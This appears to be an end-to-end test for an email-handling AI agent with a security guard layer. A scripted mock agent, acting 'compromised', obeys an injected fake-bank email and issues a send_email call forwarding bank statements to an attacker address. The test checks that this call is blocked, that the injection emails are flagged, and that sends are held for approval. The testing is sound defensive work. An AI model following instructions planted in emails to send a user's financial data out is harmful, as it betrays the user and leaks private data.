/**
 * End-to-end scenario against the real server stack (Fastify routes, Guard, MCP stdio servers, sandbox backends,
 * SQLite). Only the two LLM calls are scripted mocks, because this must run offline and deterministically.
 * Everything else, including every security decision, is the production code path.
 */
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { buildApp } from "../src/app.js";
import { loadConfig } from "../src/config.js";
import { openDb, schema } from "../src/db/index.js";
import { McpHub } from "../src/mcp/hub.js";
import { seedDemoUser } from "../src/auth.js";
import { ensureUser } from "../src/scan.js";
import { createServices } from "../src/services.js";
import { MockAgent, MockLlm, obligationJson, obligationsFrom } from "../test/helpers.js";

const ATTACKER = "statements-backup@sahyadri-bank-secure.example";

export async function runE2E(log: (line: string) => void = () => undefined): Promise<void> {
  const dir = mkdtempSync(join(tmpdir(), "munshi-e2e-"));
  const hub = new McpHub({ sandboxDir: dir });
  await hub.connect();
  const { db, sqlite } = openDb(":memory:");
  ensureUser(db);
  await seedDemoUser(db, "e2e@munshi.local", "e2e-password-1");

  const clock = { now: Date.now() };
  // Scripted extractor: grounded answers for three legitimate emails, nothing for the rest (it "behaves" here;
  // the misbehaving-extractor case is covered in the unit tests).
  const extractor = new MockLlm((req) => {
    if (req.user.includes("Amount payable: Rs 1,847.00"))
      return obligationJson({ type: "bill", title: "BESCOM electricity bill", dueDate: "2030-01-05", amount: 1847, currency: "INR", confidence: 0.92, evidenceQuote: "Amount payable: Rs 1,847.00" });
    if (req.user.includes("Refund amount: Rs 2,499.00"))
      return obligationJson({ type: "refund", title: "Amazon refund pending", dueDate: "2030-01-06", amount: 2499, currency: "INR", confidence: 0.7, evidenceQuote: "Refund amount: Rs 2,499.00" });
    if (req.user.includes("Time: 4:30 PM IST"))
      return obligationJson({ type: "appointment", title: "Dentist appointment", dueDate: "2030-01-07T16:30:00+05:30", confidence: 0.95, evidenceQuote: "Time: 4:30 PM IST" });
    return JSON.stringify({ obligations: [] });
  });

  // Scripted agent. In run 1 it is "compromised": it obeys the injected bank email and tries to forward statements.
  let run = 1;
  const agent = new MockAgent((messages, call) => {
    if (messages.length > 1) return { text: "Finished. See the Activity tab for results." };
    if (run === 2)
      return { toolCalls: [{ name: "send_email", args: { to: ["rohan.mehta@example.com"], subject: "Bills summary", body: "Your upcoming bills are listed in Munshi." } }] };
    const obs = obligationsFrom(messages);
    const by = (s: string) => obs.find((o) => o.title.includes(s))!;
    return {
      toolCalls: [
        { name: "create_event", args: { title: "BESCOM bill due", start: "2030-01-05T09:00:00+05:30", obligationId: by("BESCOM").id } },
        { name: "create_event", args: { title: "Dentist appointment", start: "2030-01-07T16:30:00+05:30", obligationId: by("Dentist").id } },
        { name: "create_event", args: { title: "Amazon refund due", start: "2030-01-06T09:00:00+05:30", obligationId: by("Amazon").id } },
        { name: "create_draft", args: { to: [by("Amazon").senderAddress], subject: "Where is my refund?", body: "Hello, my refund of Rs 2,499 is still pending.", obligationId: by("Amazon").id } },
        { name: "send_email", args: { to: [ATTACKER], subject: "Bank statements", body: "All statements attached", obligationId: by("Amazon").id } },
      ],
    };
  });

  const services = createServices({ config: { SEND_HOLD_SECONDS: 60 }, db, mcp: hub, agent, clock: () => clock.now });
  const app = buildApp({ config: loadConfig({}), db, mcp: hub, llm: extractor, services });
  let cookie = "";
  const get = async (url: string) => (await app.inject({ method: "GET", url, headers: { cookie } })).json();
  const post = async (url: string, payload: unknown = {}) => app.inject({ method: "POST", url, payload: payload as object, headers: { cookie } });
  const step = async (name: string, fn: () => Promise<void>) => {
    await fn();
    log(`PASS  ${name}`);
  };

  try {
    await step("auth: API refuses anonymous callers, then login issues an httpOnly session cookie", async () => {
      assert.equal((await app.inject({ method: "GET", url: "/api/obligations" })).statusCode, 401);
      assert.equal((await app.inject({ method: "POST", url: "/api/auth/login", payload: { email: "e2e@munshi.local", password: "wrong" } })).statusCode, 401);
      const r = await app.inject({ method: "POST", url: "/api/auth/login", payload: { email: "e2e@munshi.local", password: "e2e-password-1" } });
      assert.equal(r.statusCode, 200);
      const set = String(r.headers["set-cookie"]);
      assert.match(set, /HttpOnly/);
      assert.match(set, /SameSite=Strict/);
      cookie = set.split(";")[0]!;
      assert.equal((await app.inject({ method: "GET", url: "/api/auth/me", headers: { cookie } })).statusCode, 200);
    });

    let runId = "";
    let actions: any[] = [];

    await step("scan: obligations extracted from legitimate emails, injection emails flagged", async () => {
      const r = (await post("/api/scan")).json();
      assert.equal(r.label, "SANDBOX DATA");
      assert.equal(r.summary.listed, 15);
      assert.equal(r.summary.obligations, 3);
      assert.equal(r.summary.hiddenContentEmails, 1, "hidden newsletter text detected");
      assert.equal(r.summary.injectionEmails, 2, "both injection emails flagged");
      assert.equal((await get("/api/obligations")).obligations.length, 3);
    });

    await step("handle: agent proposes 5 actions; Guard allows, holds for approval, and blocks", async () => {
      runId = (await post("/api/runs", { goal: "Set reminders for my bills and deadlines and draft follow-ups where needed" })).json().runId;
      await services.runtime!.whenIdle();
      const d = await get(`/api/runs/${runId}`);
      assert.equal(d.run.status, "awaiting_approval");
      actions = d.actions;
      const st = (tool: string, needle: string) => actions.find((a) => a.tool === tool && JSON.stringify(a.args).includes(needle));
      assert.equal(st("create_event", "BESCOM").status, "verified", "high-confidence reminder auto-allowed, executed and read back");
      assert.equal(st("create_event", "Dentist").status, "verified");
      assert.equal(st("create_event", "Amazon").status, "pending_approval", "0.7 confidence needs approval");
      assert.equal(st("create_draft", "refund").status, "pending_approval");
      assert.equal(st("create_draft", "refund").tainted, true, "draft recipient came from an email");
    });

    await step("injection: 'forward statements' send is BLOCKED with the exact rule and source email", async () => {
      const send = actions.find((a) => a.tool === "send_email");
      assert.equal(send.status, "blocked");
      assert.equal(send.rule, "seed-block-tainted-send");
      assert.match(send.reason, new RegExp(ATTACKER));
      assert.match(send.reason, /security-alert@sahyadri-bank-secure\.example/);
      const sec = await get("/api/security");
      const entry = sec.actions.find((a: any) => a.id === send.id);
      assert.ok(entry, "appears in the Security view");
      assert.ok(entry.sources.some((s: any) => s.sender === "security-alert@sahyadri-bank-secure.example" && /URGENT/.test(s.subject)));
      assert.equal(sec.emails.filter((e: any) => e.id.startsWith("sbx-inject")).length, 2);
      assert.equal((await hub.callTool("list_recent_emails", { label: "SENT", limit: 50 })).emails.length, 0, "nothing was sent");
    });

    await step("approve: tainted draft needs acknowledgement; approvals execute and verify", async () => {
      const pending = (await get("/api/actions?status=pending_approval")).actions;
      assert.equal(pending.length, 2);
      const draft = pending.find((a: any) => a.tool === "create_draft");
      const evt = pending.find((a: any) => a.tool === "create_event");
      assert.equal((await post(`/api/actions/${draft.id}/approve`, {})).statusCode, 400, "tainted approval needs acknowledgement");
      assert.equal((await post(`/api/actions/${evt.id}/approve`, {})).json().action.status, "verified");
      assert.equal((await post(`/api/actions/${draft.id}/approve`, { acknowledgeTaint: true })).json().action.status, "verified");
      await services.runtime!.whenIdle();
      assert.equal((await get(`/api/runs/${runId}`)).run.status, "completed");
    });

    await step("undo: reminders and draft are removed and the removal is read back", async () => {
      const all = (await get("/api/actions")).actions.filter((a: any) => a.runId === runId && a.status === "verified");
      assert.equal(all.length, 4);
      for (const a of all) {
        const r = (await post(`/api/actions/${a.id}/undo`)).json();
        assert.equal(r.action.status, "undone");
        assert.equal(r.action.verify.undo.ok, true);
      }
      const events = (await hub.callTool("list_events", {})).events as { title: string }[];
      assert.ok(!events.some((e) => e.title === "BESCOM bill due"), "event really deleted");
    });

    await step("send_email: approval → hold window → cancel → nothing sent", async () => {
      run = 2;
      const id2 = (await post("/api/runs", { goal: "Email rohan.mehta@example.com a summary of my bills" })).json().runId;
      await services.runtime!.whenIdle();
      const send = (await get(`/api/runs/${id2}`)).actions[0];
      assert.equal(send.status, "pending_approval");
      assert.equal(send.tainted, false, "address typed by the user is trusted");
      const approved = (await post(`/api/actions/${send.id}/approve`, {})).json().action;
      assert.equal(approved.status, "held");
      assert.equal(approved.holdUntil, clock.now + 60_000);
      assert.equal((await hub.callTool("list_recent_emails", { label: "SENT", limit: 50 })).emails.length, 0, "held, not sent");
      assert.equal((await post(`/api/actions/${send.id}/undo`)).json().action.status, "undone");
      clock.now += 120_000;
      assert.equal(await services.executor.releaseDueHolds(), 0);
      assert.equal((await hub.callTool("list_recent_emails", { label: "SENT", limit: 50 })).emails.length, 0);
    });

    await step("audit: append-only is enforced by the database", async () => {
      const before = db.select().from(schema.auditLog).all().length;
      assert.ok(before > 20, "every step was logged");
      assert.throws(() => sqlite.prepare("UPDATE audit_log SET detail = 'x'").run(), /append-only/);
      assert.throws(() => sqlite.prepare("DELETE FROM audit_log").run(), /append-only/);
      assert.equal(db.select().from(schema.auditLog).all().length, before);
      const events = new Set(db.select().from(schema.auditLog).all().map((e) => e.event));
      for (const e of ["proposed", "decision", "approved", "executed", "verified", "undone", "held", "hidden_content_detected", "injection_suspected"]) assert.ok(events.has(e as never), `audit has ${e}`);
    });

    await step("sign out: the session ends on the server and the old cookie gets 401", async () => {
      assert.equal((await post("/api/auth/logout")).statusCode, 200);
      for (const url of ["/api/auth/me", "/api/actions", "/api/obligations", "/api/audit"]) {
        assert.equal((await app.inject({ method: "GET", url, headers: { cookie } })).statusCode, 401, url);
      }
      assert.equal((await post("/api/scan")).statusCode, 401, "writes are refused too");
      assert.ok(db.select().from(schema.auditLog).all().some((e) => e.event === "logout"), "logout is audited");
    });
  } finally {
    await app.close();
    rmSync(dir, { recursive: true, force: true });
  }
}
